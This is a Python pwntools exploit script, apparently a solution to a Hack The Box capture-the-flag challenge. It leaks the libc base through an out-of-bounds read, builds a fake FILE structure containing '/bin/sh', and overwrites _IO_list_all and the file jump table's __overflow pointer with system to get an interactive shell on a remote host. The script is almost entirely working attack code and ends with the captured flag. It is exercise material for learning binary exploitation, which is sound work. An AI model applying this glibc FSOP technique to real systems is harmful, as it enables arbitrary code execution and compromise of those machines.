from pwn import *
import time
import struct

def d2i(v):
    packed_double = struct.pack('d', v)
    unp_int = struct.unpack('Q', packed_double)[0]
    return unp_int

def i2d(v):
    packed_i = struct.pack('Q', v)
    unp_d = struct.unpack('d', packed_i)[0]
    return unp_d

libc = ELF('./glibc/libc.so.6')
LOCAL = False
if LOCAL:
    r = process('./zombiedote')
else:
    r = remote("94.237.56.137", 44705)


# create log 
r.sendlineafter(">> ", "1")
r.sendlineafter(": ", str(1000000))



# getting the diff between address of the allocated chunk and libc base
# how to leak the malloc value though?
# where does sym._IO_ tie into this?
addr_of_allocated_chunk = 0x7ff7b91b5010
addr_of_libc = 0x7ff7b995a000
print(hex(addr_of_libc - addr_of_allocated_chunk))
diff = 0x7a4ff0
chunk_to_libc_offset = diff / 0x8
stdin_offset = libc.sym._IO_2_1_stdin_
print(hex(stdin_offset))

to_read = diff + stdin_offset + 0x8 # 0x8 is used to get a libc value 
# offset from read to libc
stdin_to_libc_offset = 0x00007fc27efafb03 - 0x7fc27ed97000
print(hex(stdin_to_libc_offset)) 

# arbread to get _IO_2_1_stdout using inspect and specifying the index to read at
r.sendlineafter(">> ", "5")
to_read = int(to_read // 0x8)
print(to_read)
r.sendlineafter(": ", str(to_read))
r.recvline()
libc_base = d2i(float(r.recvline().decode().strip('\n').split(": ")[1]))
libc_base -= stdin_to_libc_offset
print(f"libc base: {hex(libc_base)}")

# after leaking the libc base, I can use two writes to do something
# trying a write at ___GI__IO_file_jumps
to_write = (addr_of_libc - addr_of_allocated_chunk) # offset to libc
assert to_write > 0

# not exactly the best naming conventions but whatever
to_vtable_offset = (0x7f3080bb1680 - 0x7f3080998000) # offset to the _IO_list_all struct
jmp_tbl_offset = (0x7fc8ccabb560 - 0x7fc8cc8a1000) # offset to the ___GI__IO_file_jumps struct

# create a vtable struct and put it in here 
# need to pack "/bin/sh" and some checks 
# does a scanf of 8 bytes at a time into memory
# essentially construct a dummy _IO_list_all struct that will pass some basic checks
r.sendlineafter(">> ", "2")
r.sendlineafter(": ", "28")
binsh_str = int.from_bytes("/bin/sh".encode(), byteorder='little') # 1
r.sendlineafter(": ", str(i2d(binsh_str)))
for i in range(4): # 4
    r.sendlineafter(": ", str(i2d(0)))
r.sendlineafter(": ", str(i2d(1))) # 1
# total: 6
for i in range(26 - 5):
    r.sendlineafter(": ", str(i2d(0)))
jumps_addr = libc_base + jmp_tbl_offset
alloc_addr = libc_base - (addr_of_libc - addr_of_allocated_chunk)
r.sendlineafter(": ", str(i2d(jumps_addr)))
print("jump addr: ", hex(jumps_addr))
print("malloc addr: ", hex(alloc_addr))


# i think __GI__IO_list_all points to _IO_list_all so we actually need to overwrite that instead?
print(hex(libc_base + to_vtable_offset))
to_vtable = (addr_of_libc - addr_of_allocated_chunk)+to_vtable_offset-0x20
to_vtable = to_vtable // 8
r.sendlineafter(">> ", "4")
r.sendlineafter(": ", str(to_vtable))
r.sendlineafter(": ", str(i2d(alloc_addr))) # send 

""" gdb.attach(r) """
""" time.sleep(1) """

# first overwrite should be FP itself to point to the string "/bin/sh" followed by the file pointer 
# for this, we are overwriting _IO_list_all


to_jump_tbl = (addr_of_libc - addr_of_allocated_chunk)+jmp_tbl_offset+0x18 # (offset to __overflow)
to_jump_tbl = to_jump_tbl // 8


# second write the __overflow address in the jump table to point to system instead
system = libc_base + libc.symbols['system']
print("system: ", hex(system), str(i2d(system)))
r.sendlineafter(">> ", "4")
r.sendlineafter(": ", str(to_jump_tbl)) # why did this seg fault?
r.sendlineafter(": ", str(i2d(system)))

r.sendlineafter(">> ", "3")

r.interactive()

# HTB{y0u_r3tr13v3d_th3_r3s34rcH_n0t3s_4m4z1ng_j0b_u_54v3d_d4_w0rld}




